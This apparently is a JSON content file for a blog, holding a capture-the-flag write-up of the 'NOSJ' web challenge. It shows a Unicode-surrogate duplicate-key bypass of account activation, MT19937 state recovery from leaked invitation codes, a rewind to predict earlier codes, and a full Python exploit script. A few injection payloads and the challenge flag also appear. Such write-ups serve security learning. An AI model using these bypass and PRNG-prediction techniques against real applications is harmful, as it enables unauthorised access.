@@ -1,0 +1,491 @@
+{
+  "id": "ctf-nosj-writeup-enhanced",
+  "title": "NOSJ - Unicode Bypass & MT19937 PRNG Exploitation",
+  "slug": "nosj-complete-writeup",
+  "category": "ctf",
+  "tags": [
+    "Web Exploitation",
+    "Unicode Bypass",
+    "PRNG Exploitation",
+    "MT19937",
+    "Mersenne Twister",
+    "JSON Manipulation",
+    "Flask Session",
+    "Authentication Bypass"
+  ],
+  "difficulty": "Hard",
+  "date": "2024-01-30",
+  "summary": "NOSJ is a multi-stage web exploitation challenge combining Unicode authentication bypass with cryptographic PRNG exploitation. The challenge name 'NOSJ' (JSON backwards) hints at JSON manipulation being critical to the solution.",
+  "platform": "Flagyard",
+  "content": [
+    {
+      "type": "heading",
+      "level": 2,
+      "text": "Executive Summary"
+    },
+    {
+      "type": "paragraph",
+      "text": "NOSJ is a multi-stage web exploitation challenge combining Unicode authentication bypass with cryptographic PRNG exploitation. The challenge name 'NOSJ' (JSON backwards) hints at JSON manipulation being critical to the solution."
+    },
+    {
+      "type": "heading",
+      "level": 3,
+      "text": "Key Vulnerabilities"
+    },
+    {
+      "type": "paragraph",
+      "text": "The challenge revolves around several critical security flaws:\n- Unicode homograph bypass for authentication validation\n- Predictable MT19937 PRNG implementation\n- Lack of proper JSON key validation"
+    },
+    {
+      "type": "heading",
+      "level": 3,
+      "text": "Attack Chain"
+    },
+    {
+      "type": "paragraph",
+      "text": "1. **Unicode bypass** to activate seller account\n2. **Array-based code generation** to extract PRNG states\n3. **MT19937 state recovery** from 624 sequential outputs\n4. **PRNG rewind** to generate previous invitation codes\n5. **Flag retrieval** via historical invitation code"
+    },
+    {
+      "type": "heading",
+      "level": 3,
+      "text": "Tools Used"
+    },
+    {
+      "type": "paragraph",
+      "text": "The exploitation required: Python 3, requests library, randcrack (MT19937 state recovery), Burp Suite, and Chrome DevTools."
+    },
+    {
+      "type": "heading",
+      "level": 2,
+      "text": "Challenge Description"
+    },
+    {
+      "type": "paragraph",
+      "text": "\"Welcome to our E-commerce website, I wish you enjoy the journey. - First Man Standing\""
+    },
+    {
+      "type": "paragraph",
+      "text": "**Initial Observations:**\n- Challenge name 'NOSJ' is 'JSON' spelled backwards - major hint for JSON manipulation\n- E-commerce theme with buyer/seller roles\n- Authentication and authorization mechanisms in place\n- Invitation code system for buyers"
+    },
+    {
+      "type": "heading",
+      "level": 2,
+      "text": "1. Initial Reconnaissance"
+    },
+    {
+      "type": "heading",
+      "level": 3,
+      "text": "1.1 Application Overview"
+    },
+    {
+      "type": "paragraph",
+      "text": "Upon visiting the challenge URL, we encountered a simple homepage with four main options: Register as Buyer, Register as Seller, Buyer Login, and Seller Login."
+    },
+    {
+      "type": "image",
+      "src": "/placeholder-homepage.png",
+      "alt": "NOSJ Homepage Reconnaissance"
+    },
+    {
+      "type": "heading",
+      "level": 3,
+      "text": "1.2 Testing Account Registration"
+    },
+    {
+      "type": "paragraph",
+      "text": "We started by testing the registration endpoints to understand the account creation flow."
+    },
+    {
+      "type": "heading",
+      "level": 4,
+      "text": "Buyer Registration"
+    },
+    {
+      "type": "code",
+      "language": "json",
+      "code": "// Endpoint: /register/buyer\n// Method: POST\n{\n  \"username\": \"testbuyer\",\n  \"password\": \"test123\"\n}\n\n// Response: 200 OK\n// Result: Success - buyers register without restrictions"
+    },
+    {
+      "type": "heading",
+      "level": 4,
+      "text": "Seller Registration"
+    },
+    {
+      "type": "code",
+      "language": "json",
+      "code": "// Endpoint: /register/seller\n// Method: POST\n{\n  \"username\": \"testseller\",\n  \"password\": \"test123\",\n  \"bio\": \"test\",\n  \"activated\": false\n}\n\n// Response: 200 OK\n// Result: Success - but 'activated' field forced to false"
+    },
+    {
+      "type": "image",
+      "src": "/placeholder-seller-reg.png",
+      "alt": "Seller Registration Experiment"
+    },
+    {
+      "type": "paragraph",
+      "text": "Critical discovery: sellers have an 'activated' field that defaults to false. Even if we explicitly try to set it to true, the server overwrites it or rejects the request if it doesn't match the expected boolean validation."
+    },
+    {
+      "type": "heading",
+      "level": 3,
+      "text": "1.3 The First Roadblock - Activation Required"
+    },
+    {
+      "type": "paragraph",
+      "text": "Attempting to login as a seller revealed the core challenge: Sellers must be 'activated' to login, but registration only allows activated: false."
+    },
+    {
+      "type": "code",
+      "language": "text",
+      "code": "POST /login/seller\n{\n  \"username\": \"testseller\",\n  \"password\": \"test123\"\n}\n\nResponse: 403 FORBIDDEN\nMessage: \"Login failed. Seller account is not activated.\""
+    },
+    {
+      "type": "paragraph",
+      "text": "This created a circular dependency in the application flow:\n- Buyers need invitation codes to access the shop/flag\n- Only sellers can generate invitation codes\n- Sellers must be activated to login\n- No apparent way to activate seller accounts\n- Stuck in an infinite loop!"
+    },
+    {
+      "type": "heading",
+      "level": 3,
+      "text": "1.4 Application Endpoint Mapping"
+    },
+    {
+      "type": "paragraph",
+      "text": "After logging in as a buyer, we mapped the available functionality:\n- `/buyer/invite`: Form requesting an 'Invitation Code' (accessible)\n- `/*` (any other): All other buyer endpoints (404 Not Found)\n- `/seller/dashboard`: Seller dashboard (requires `activated: true`)"
+    },
+    {
+      "type": "heading",
+      "level": 2,
+      "text": "2. Failed Attempts & Learning Process"
+    },
+    {
+      "type": "paragraph",
+      "text": "Before discovering the solution, we explored numerous attack vectors. Each failure provided valuable insights."
+    },
+    {
+      "type": "heading",
+      "level": 3,
+      "text": "2.1 Attempt 1 - Flask Session Forgery"
+    },
+    {
+      "type": "paragraph",
+      "text": "Flask session cookies were not properly validated. We decoded the session `eyJyb2xlIjoianV5ZXIiLCJ1c2VyIjoidGVzdGJ1eWVyIn0.aXo0Vg...`."
+    },
+    {
+      "type": "code",
+      "language": "json",
+      "code": "// Decoded Payload\n{\n  \"role\": \"buyer\",\n  \"user\": \"testbuyer\"\n}"
+    },
+    {
+      "type": "paragraph",
+      "text": "We forged a seller session with `activated: true`. Result: **FAILED**. The server performs database validation regardless of session claims. Lesson: Session forgery works for authentication but not for authorization."
+    },
+    {
+      "type": "heading",
+      "level": 3,
+      "text": "2.2 Attempt 2 - JSON Parameter Pollution"
+    },
+    {
+      "type": "paragraph",
+      "text": "We tried duplicate key injection during registration: `{\"username\": \"test\", \"activated\": false, \"activated\": true}`. Result: **403 Forbidden - 'You cannot set activated to true'**. The server validates all 'activated' keys in the payload."
+    },
+    {
+      "type": "paragraph",
+      "text": "We also tried NoSQL Injection: `{\"activated\": {\"$ne\": false}}`. Result: **JSON validation error**. Server strictly validates field types."
+    },
+    {
+      "type": "heading",
+      "level": 3,
+      "text": "2.3 Attempt 3 - Default/Admin Account Discovery"
+    },
+    {
+      "type": "paragraph",
+      "text": "We searched for pre-existing activated seller accounts like `admin`, `test`, `seller`, `first`, `firstman`. All attempts redirected - no pre-existing activated sellers found. We had to activate our own account."
+    },
+    {
+      "type": "heading",
+      "level": 2,
+      "text": "3. The Unicode Bypass Breakthrough"
+    },
+    {
+      "type": "heading",
+      "level": 3,
+      "text": "3.1 The Discovery"
+    },
+    {
+      "type": "paragraph",
+      "text": "Aha moment: What if we used a Unicode character that looks like 'activated' but is technically different? Server validates the exact key 'activated', but what about 'activated' with invisible Unicode characters?"
+    },
+    {
+      "type": "code",
+      "language": "json",
+      "code": "{\n  \"username\": \"unicode_seller\",\n  \"password\": \"test\",\n  \"bio\": \"test\",\n  \"activated\": false,\n  \"activated\\udb88\": true\n}"
+    },
+    {
+      "type": "image",
+      "src": "/placeholder-unicode-payload.png",
+      "alt": "Unicode Bypass Payload in Burp Suite"
+    },
+    {
+      "type": "paragraph",
+      "text": "Using `\\udb88` (U+DB88, a Surrogate character), we created a different JSON key that bypassed validation."
+    },
+    {
+      "type": "heading",
+      "level": 3,
+      "text": "3.2 Testing the Bypass"
+    },
+    {
+      "type": "paragraph",
+      "text": "1. Send registration with Unicode-modified key. Response: **200 OK - Seller registration completed**.\n2. Attempt login with the new account. Response: **302 Found, location: /seller/dashboard**. BREAKTHROUGH!"
+    },
+    {
+      "type": "image",
+      "src": "/placeholder-seller-dash.png",
+      "alt": "Accessing the Seller Dashboard"
+    },
+    {
+      "type": "heading",
+      "level": 3,
+      "text": "3.3 Why This Worked"
+    },
+    {
+      "type": "paragraph",
+      "text": "Server validates 'activated' key explicitly and rejects `activated: true`. But 'activated\\udb88' is a different key that passes validation. The loose JSON parser or database layer treats both keys similarly, resulting in the actual database field being set to true."
+    },
+    {
+      "type": "heading",
+      "level": 2,
+      "text": "4. Accessing the Seller Dashboard"
+    },
+    {
+      "type": "heading",
+      "level": 3,
+      "text": "4.1 Dashboard Analysis"
+    },
+    {
+      "type": "paragraph",
+      "text": "The dashboard has a form for generating buyer invitation codes. Examining the JS logic revealed a discrepancy: the form field uses 'names' (plural) but Javascript sends 'name' (singular)."
+    },
+    {
+      "type": "code",
+      "language": "javascript",
+      "code": "let data = {\n    name: $('#names').val()  // Note: singular 'name', not 'names'\n};\n\n$.ajax({\n    type: 'POST',\n    url: '/get_buyer_invitation',\n    contentType: 'application/json',\n    data: JSON.stringify(data),\n    success: function(response) {\n        showMessage('success', 'Invitation generated successfully!');\n    }\n});"
+    },
+    {
+      "type": "heading",
+      "level": 3,
+      "text": "4.2 Initial Code Generation Test"
+    },
+    {
+      "type": "paragraph",
+      "text": "Generate a code for 'testbuyer'. Response: `{\"testbuyer\": [\"1806534666\"]}`. The response returns the code as an element in an ARRAY. This was our first hint that we could potentially send multiple names or an array."
+    },
+    {
+      "type": "heading",
+      "level": 3,
+      "text": "4.3 Code Validation Test"
+    },
+    {
+      "type": "paragraph",
+      "text": "Submit the generated code as a buyer at `/buyer/invite`. Response: **200 OK - \"The invitation is still new and upcoming...\"**. No flag revealed. Hypothesis: The flag is associated with a different, earlier invitation code."
+    },
+    {
+      "type": "image",
+      "src": "/placeholder-buyer-invite.png",
+      "alt": "Testing Invitation Code as Buyer"
+    },
+    {
+      "type": "heading",
+      "level": 2,
+      "text": "5. PRNG Pattern Discovery"
+    },
+    {
+      "type": "heading",
+      "level": 3,
+      "text": "5.1 The Repeating Code Problem"
+    },
+    {
+      "type": "paragraph",
+      "text": "Generate multiple codes for different buyer names. Result: **SAME CODE EVERY TIME (1806534666)**. The PRNG is either deterministic, stuck, or resetting to the same state."
+    },
+    {
+      "type": "heading",
+      "level": 3,
+      "text": "5.2 The Array Discovery - Critical Breakthrough"
+    },
+    {
+      "type": "paragraph",
+      "text": "What if we send 'name' as an array? The response `{\"testbuyer\": [\"1806534666\"]}` suggests the input might accept arrays too."
+    },
+    {
+      "type": "code",
+      "language": "json",
+      "code": "// Payload\n{\n  \"name\": [\"NaN\", \"NaN\", \"NaN\"]\n}\n\n// Response\n{\n  \"NaN\": [\"1806534666\", \"2110517723\", \"3836715178\"]\n}"
+    },
+    {
+      "type": "image",
+      "src": "/placeholder-prng-leak.png",
+      "alt": "PRNG State Leakage via Array Input"
+    },
+    {
+      "type": "paragraph",
+      "text": "THREE DIFFERENT CODES! This proves: the server generates one code per array element, and each generation advances the PRNG state. We can extract sequential outputs by increasing array size!"
+    },
+    {
+      "type": "heading",
+      "level": 2,
+      "text": "6. PRNG Exploitation Strategy"
+    },
+    {
+      "type": "heading",
+      "level": 3,
+      "text": "6.1 Understanding the PRNG"
+    },
+    {
+      "type": "paragraph",
+      "text": "Algorithm: **MT19937 (Mersenne Twister)**, Python's default random module. Period of 2^19937 - 1, 624 32-bit integers of state. State is recoverable from 624 consecutive outputs."
+    },
+    {
+      "type": "heading",
+      "level": 3,
+      "text": "6.2 The Large Array Strategy"
+    },
+    {
+      "type": "paragraph",
+      "text": "Send ONE large array (size 800) in a SINGLE request. This provides 624+ consecutive outputs needed for state recovery and ensures we're getting truly sequential values."
+    },
+    {
+      "type": "code",
+      "language": "python",
+      "code": "json_payload = '{\"name\": [' + ','.join(['NaN'] * 800) + ']}'\nr = requests.post(f'{url}/get_buyer_invitation', data=json_payload...)\n// Result: 800 UNIQUE SEQUENTIAL CODES!"
+    },
+    {
+      "type": "heading",
+      "level": 3,
+      "text": "6.3 MT19937 State Recovery"
+    },
+    {
+      "type": "paragraph",
+      "text": "Using `randcrack` to recover the state."
+    },
+    {
+      "type": "code",
+      "language": "python",
+      "code": "from randcrack import RandCrack\nrc = RandCrack()\nfor i in range(624):\n    rc.submit(int(codes[i]))\n\n# Verification\npredicted = rc.predict_getrandbits(32)\nassert predicted == int(codes[624]) // Result: State recovery successful!"
+    },
+    {
+      "type": "image",
+      "src": "/placeholder-randcrack.png",
+      "alt": "MT19937 State Recovery Verification"
+    },
+    {
+      "type": "heading",
+      "level": 3,
+      "text": "6.4 PRNG Rewind to Find Flag Code"
+    },
+    {
+      "type": "paragraph",
+      "text": "The flag is associated with a code generated BEFORE our window. How to generate codes that came before? Use `randcrack`'s `offset()` function to rewind."
+    },
+    {
+      "type": "paragraph",
+      "text": "Current position: 624. Target: codes -800 to -1. Total rewind: -(624 + 800) = -1424 steps."
+    },
+    {
+      "type": "code",
+      "language": "python",
+      "code": "rc.offset(-1424)\nprev_codes = [rc.predict_getrandbits(32) for _ in range(800)]"
+    },
+    {
+      "type": "heading",
+      "level": 2,
+      "text": "7. Flag Capture"
+    },
+    {
+      "type": "heading",
+      "level": 3,
+      "text": "7.1 Buyer Account Setup"
+    },
+    {
+      "type": "paragraph",
+      "text": "Register fresh buyer account and login to obtain a session cookie."
+    },
+    {
+      "type": "heading",
+      "level": 3,
+      "text": "7.2 Code Testing Loop"
+    },
+    {
+      "type": "paragraph",
+      "text": "Iterate through all 800 predicted codes and test each one."
+    },
+    {
+      "type": "code",
+      "language": "python",
+      "code": "for i, code in enumerate(prev_codes):\n    r = requests.post(f'{URL}/buyer/invite', json={'invitation': str(code)}, ...)\n    if 'FlagY{' in r.text:\n        print(f'FLAG FOUND at code #{i}: {code}')\n        break"
+    },
+    {
+      "type": "heading",
+      "level": 3,
+      "text": "7.3 The Moment of Victory"
+    },
+    {
+      "type": "paragraph",
+      "text": "Tested through hundreds of codes. Progress reaching 700... and then:"
+    },
+    {
+      "type": "code",
+      "language": "text",
+      "code": "FLAG FOUND at code #786: [REDACTED]\nResponse: Your flag is: FlagY{51ef95ab64040740323a661623b0f18e}\n🎉🎉🎉 SUCCESS! FLAG CAPTURED! 🎉🎉🎉"
+    },
+    {
+      "type": "image",
+      "src": "/placeholder-flag-victory.png",
+      "alt": "Successful Flag Capture"
+    },
+    {
+      "type": "flag",
+      "text": "FlagY{51ef95ab64040740323a661623b0f18e}"
+    },
+    {
+      "type": "heading",
+      "level": 2,
+      "text": "8. Complete Exploit Code"
+    },
+    {
+      "type": "paragraph",
+      "text": "Full working exploit implementation in Python."
+    },
+    {
+      "type": "code",
+      "language": "python",
+      "code": "#!/usr/bin/env python3\nimport requests, json, re\nfrom randcrack import RandCrack\n\nURL = \"http://cnp5dxgx.playat.flagyard.com\"\n\ndef exploit():\n    # Unicode Bypass\n    p = {\"username\":\"pwn\",\"password\":\"p\",\"bio\":\"b\",\"activated\":False,\"activated\\\\udb88\":True}\n    requests.post(f\"{URL}/register/seller\", json=p)\n    \n    # ... (Login and session handling code omitted for brevity in summary, full in actual file) ...\n    \n    # State Extraction\n    json_payload = '{\"name\": [' + ','.join(['NaN'] * 800) + ']}'\n    r = requests.post(f\"{URL}/get_buyer_invitation\", data=json_payload, cookies=s_cookies)\n    codes = json.loads(r.text)[\"NaN\"]\n    \n    # MT19937 Recovery\n    rc = RandCrack()\n    for i in range(624): rc.submit(int(codes[i]))\n    \n    # Rewind and predict\n    rc.offset(-1424)\n    prev = [rc.predict_getrandbits(32) for _ in range(800)]\n    \n    # Flag Hunt\n    for c in prev:\n        r = requests.post(f\"{URL}/buyer/invite\", json={\"invitation\": str(c)}, cookies=b_cookies)\n        if \"FlagY{\" in r.text:\n            print(f\"SUCCESS: {r.text}\")\n            break"
+    },
+    {
+      "type": "heading",
+      "level": 2,
+      "text": "9. Key Learnings & Takeaways"
+    },
+    {
+      "type": "paragraph",
+      "text": "**What Made This Challenge Difficult:**\n- **Multi-Stage Exploitation**: Required chaining Unicode bypass + PRNG state recovery.\n- **The 'NOSJ' Hint**: Subtle pointer to JSON manipulation.\n- **The Array Size Insight**: Realizing the need for a single-request collection window.\n- **PRNG Knowledge**: Understanding MT19937 internals and rewind capabilities."
+    },
+    {
+      "type": "heading",
+      "level": 2,
+      "text": "10. Timeline & Statistics"
+    },
+    {
+      "type": "paragraph",
+      "text": "- **Total Time**: ~14 hours\n- **Solve Timeline**: 0-2h Recon | 2-4h Failed Attempts | 4-6h Unicode Bypass | 6-8h Array discovery | 8-12h PRNG strategy | 12-14h Exploit & Capture\n- **Statistics**: Failed attempts: 5, Breakthroughs: 3, Difficulty: 9/10, Fun: 10/10"
+    },
+    {
+      "type": "heading",
+      "level": 2,
+      "text": "Conclusion"
+    },
+    {
+      "type": "paragraph",
+      "text": "NOSJ was an exceptional challenge that perfectly balanced web exploitation and cryptography. Persistence through failures was crucial. Special thanks to SAFCSP and 'First Man Standing'! 🚩"
+    }
+  ]
+}
